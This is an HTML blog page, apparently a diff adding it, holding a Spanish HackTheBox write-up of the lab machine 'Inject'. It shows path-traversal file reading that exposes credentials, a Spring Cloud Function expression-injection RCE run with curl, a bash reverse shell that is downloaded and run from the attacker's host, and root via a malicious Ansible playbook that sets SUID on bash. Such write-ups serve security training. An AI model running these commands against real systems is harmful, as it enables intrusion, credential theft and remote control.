@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Inject - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Inject - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Inject de hackthebox una maquina linux de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un LFI y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de spring framework que nos otorgara RCE y finalmente para elevar nuestros privilegios abusaremos de una cron job para crearnos un archivo malicioso ansible playbook, manipulando los permisos de la bash y asi convertirnos en el usuario root. Maquina curiosa asi que vamos a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Inject de hackthebox una maquina linux de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un LFI y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de spring framework que nos otorgara RCE y finalmente para elevar nuestros privilegios abusaremos de una cron job para crearnos un archivo malicioso ansible playbook, manipulando los permisos de la bash y asi convertirnos en el usuario root. Maquina curiosa asi que vamos a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Inject" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Inject" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Inject/inject.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-19T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Inject/inject.jpg" />
+<meta property="twitter:title" content="Maquina Inject - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-07-19T00:00:00+00:00","datePublished":"2023-07-19T00:00:00+00:00","description":"El dia de hoy vamos a resolver Inject de hackthebox una maquina linux de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un LFI y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de spring framework que nos otorgara RCE y finalmente para elevar nuestros privilegios abusaremos de una cron job para crearnos un archivo malicioso ansible playbook, manipulando los permisos de la bash y asi convertirnos en el usuario root. Maquina curiosa asi que vamos a darle!.","headline":"Maquina Inject - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Inject/inject.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Inject"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Inject"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Inject - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-07-19">19 Jul 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Inject/inject.jpg" alt="Maquina Inject - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Inject</code> de <code>hackthebox</code> una maquina <code>linux</code> de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un <code>LFI</code> y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de <code>spring framework</code> que nos otorgara <code>RCE</code> y finalmente para elevar nuestros privilegios abusaremos de una <code>cron job</code> para crearnos un archivo malicioso <code>ansible playbook</code>, manipulando los permisos de la <code>bash</code> y asi convertirnos en el usuario <code>root</code>.</p>
+
+<p>Maquina curiosa asi que vamos a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Inject
+❯ ls
+
+ Inject
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.11.204
+PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
+64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms
+
+--- 10.10.11.204 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code> y por proximidad seria correspondiente a una maquina <code>linux</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
+Initiating SYN Stealth Scan at 18:09
+Scanning 10.10.11.204 [65535 ports]
+Discovered open port 8080/tcp on 10.10.11.204
+Discovered open port 22/tcp on 10.10.11.204
+Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.204
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-07-19 18:09:29 GMT for 16s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
+           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
+Nmap scan report for 10.10.11.204
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
+|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
+|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
+</code></pre>
+
+<p>Visulizamos información interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.2p1</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td>HTTP</td>
+      <td>nagios-nsca Nagios NSCA</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>
+
+<p>Comenzamos usando <code>whatweb</code>, para determinar las tecnologias que esta usando el servicio web.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.204:8080
+http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
+</code></pre>
+
+<p>La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj1.PNG" alt="" /></p>
+
+<p>Observamos que existe una sección de login y registro pero que esta actualmente en construcción.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj2.PNG" alt="" /></p>
+
+<p>En la pagina principal tambien podemos ver una sección de <code>upload</code>, la cual nos redirige a una ruta de subida de archivos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj3.PNG" alt="" /></p>
+
+<p>Vamos a tratar de subir un archivo simple con extensión <code>txt</code> y vamos a interceptar la petición con <code>burpsuite</code> para realizar pruebas.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj4.PNG" alt="" /></p>
+
+<p>Interceptamos la petición y la mandamos al <code>Repeater</code>, y vemos como respuesta que solo podemos subir imagenes.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj5.PNG" alt="" /></p>
+
+<p>Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj6.PNG" alt="" /></p>
+
+<p>Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un <code>LFI</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=.."
+java
+resources
+uploads
+</code></pre>
+
+<p>Ahora podemos listar los usuarios de el archivo <code>/etc/passwd</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd" | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+</code></pre>
+
+<p>Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo <code>settings.xml</code> en el directorio del usuario <code>frank</code>. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario <code>phill</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2"
+settings.xml
+❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml" -o settings.xml
+</code></pre>
+
+<pre><code class="language-xml">❯ cat settings.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;id&gt;Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+</code></pre>
+
+<p>Si tratamos de contectarnos por el servicio <code>ssh</code>, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo <code>pom.xml</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../"
+.classpath
+.DS_Store
+.idea
+.project
+.settings
+HELP.md
+mvnw
+mvnw.cmd
+pom.xml
+src
+target
+</code></pre>
+
+<p>Si vemos el contenido vemos que esta relacionado a <code>spring framework</code>.</p>
+
+<pre><code class="language-xml">❯ cat pom.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
+	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+	&lt;parent&gt;
+		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+		&lt;version&gt;2.6.5&lt;/version&gt;
+		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
+</code></pre>
+
+<blockquote>
+  <p>Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development.</p>
+</blockquote>
+
+<p>Si buscamos un poco encontramos un exploit que nos otorga <code>RCE</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit">https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit</a></li>
+</ul>
+
+<p>Si abrimos el explit, observamos que este se aprovecha de una ruta <code>functionRouter</code> y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Inject/inj7.PNG" alt="" /></p>
+
+<p>Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio <code>curl</code>. Nos mandamos una traza a nuestra maquina host.</p>
+
+<pre><code class="language-bash">❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 10.10.16.2")' -d '.'
+{"timestamp":"2023-07-19T18:56:07.739+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"
+</code></pre>
+
+<p>Y recibimos la petición.</p>
+
+<pre><code class="language-bash">❯ tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+18:56:22.791783 IP 10.10.11.204 &gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
+18:56:22.791819 IP 10.10.16.2 &gt; 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
+</code></pre>
+
+<p>Para ganar acceso vamos a crearnos un archivo en bash de nombre <code>index.html</code> que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.</p>
+
+<pre><code class="language-bash">❯ cat index.html
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1
+</code></pre>
+
+<p>Realizamos la petición.</p>
+
+<pre><code class="language-bash">❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.2 -o /tmp/reverse")' -d '.'
+{"timestamp":"2023-07-19T18:58:54.291+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
+</code></pre>
+
+<p>Recibimos la petición en nuestro servicio.</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.204 - - [19/Jul/2023 18:59:09] "GET / HTTP/1.1" 200 -
+</code></pre>
+
+<p>Ahora solo debemos ejecutarlo y ponermos en escucha con <code>ntcat</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse")' -d '.'
+{"timestamp":"2023-07-19T19:05:11.598+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                        
+</code></pre>
+
+<p>Obtenemos acceso como el usuario <code>frank</code>.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.204.
+Ncat: Connection from 10.10.11.204:60530.
+bash: cannot set terminal process group (827): Inappropriate ioctl for device
+bash: no job control in this shell
+frank@inject:/$ whoami
+whoami
+frank
+</code></pre>
+
+<p>Como siempre hacemos el tratamiento para obtener una full <code>tty</code>.</p>
+
+<pre><code class="language-bash">frank@inject:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+frank@inject:/$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+frank@inject:/$ export TERM=xterm
+frank@inject:/$ export SHELL=bash
+frank@inject:/$ stty rows 45 columns 184
+</code></pre>
+
+<p>Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.</p>
+
+<pre><code class="language-bash">frank@inject:/$ find / -name user.txt 2&gt;/dev/null
+/home/phil/user.txt
+^C
+frank@inject:/$ cat /home/phil/user.txt
+cat: /home/phil/user.txt: Permission denied
+</code></pre>
+
+<p>Recordemos que antes obtuvimos unas credenciales del usuario <code>phil</code>, asi que vamos a tratar de usar esa contraseña y migrar al usuario <code>phil</code>.</p>
+
+<pre><code class="language-bash">frank@inject:/$ su phil
+Password: 
+phil@inject:/$ whoami
+phil
+</code></pre>
+<p>Ahora podemos leer la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">phil@inject:/$ cd /home/phil/
+phil@inject:~$ cat user.txt 
+7b309ae956b0821aef61ef39aa5d4f7e
+</code></pre>
+
+<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Ya que somos el usuario <code>phil</code>, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a <code>staff</code>. Seguidamente listamos los recuros a los que tenemos acceso.</p>
+
+<pre><code class="language-bash">phil@inject:~$ id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+phil@inject:~$ find / -group staff 2&gt;/dev/null
+/opt/automation/tasks
+/root
+/var/local
+/usr/local/lib/python3.8
+/usr/local/lib/python3.8/dist-packages
+/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
+/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
+/usr/local/lib/python3.8/dist-packages/__pycache__
+/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
+/usr/local/share/fonts
+/usr/local/share/fonts/.uuid
+phil@inject:~$ /opt/automation/tasks
+bash: /opt/automation/tasks: Is a directory
+phil@inject:~$ ls -l /opt/automation/tasks
+total 4
+-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
+</code></pre>
+
+<p>Observamos un <code>playbook.yml</code>, si investigamos un poco encotramos que esta relacionado a ansible.</p>
+
+<blockquote>
+  <p>Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.</p>
+</blockquote>
+
+<p>Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.</p>
+
+<pre><code class="language-bash">phil@inject:/tmp$ cat procmon.sh
+#!/bin/bash
+
+old_process=$(ps -eo user, command)
+
+while true; do
+	new_process=$(ps -eo user, command)
+	diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&lt;]" | grep -vE "procmon|kworker|command"
+	old_process=$new_process
+done
+</code></pre>
+
+<p>Ejecutamos el script y obervamos que el usuario <code>root</code> esta ejecutando un borrado de todo lo que se encuentra en el directorio <code>tasks</code>.</p>
+
+<pre><code class="language-bash">phil@inject:/tmp$ ./procmon.sh 
+&lt; root     /usr/sbin/CRON -f
+&lt; root     /bin/sh -c sleep 10 &amp;&amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;&amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+&lt; root     sleep 10
+</code></pre>
+
+<p>Lo que podemos hacer es crearnos un archivo similar a <code>playbook_1.yml</code> para insertar un comando y al ejecutar la tarea el usuario <code>root</code>, podemos tratar de cambiar los permisos de la <code>bash</code> otorgandole <code>suid</code> y asi poder convertirnos en el usuario <code>root</code>.</p>
+
+<p>Para ello primero debemos crearnos un archivo <code>reverse.yml</code> malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.</p>
+
+<ul>
+  <li><a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html</a></li>
+</ul>
+
+<pre><code class="language-bash">phil@inject:/opt/automation/tasks$ cat reverse.yml 
+- hosts: localhost
+  tasks:
+  - name: suid to bash
+    ansible.builtin.shell: chmod u+s /bin/bash
+</code></pre>
+
+<p>Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la <code>bash</code> ahora cuenta con el privilegio <code>suid</code>.</p>
+
+<pre><code class="language-bash">phil@inject:/opt/automation/tasks$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+</code></pre>
+
+<p>Lo que nos queda ahora es convertirnos en el usuario <code>root</code>, dirigirnos a su directorio personal y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">phil@inject:/opt/automation/tasks$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt 
+26521e5fb779f8e62fa4d068175a3b5a
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Inject - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Inject" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
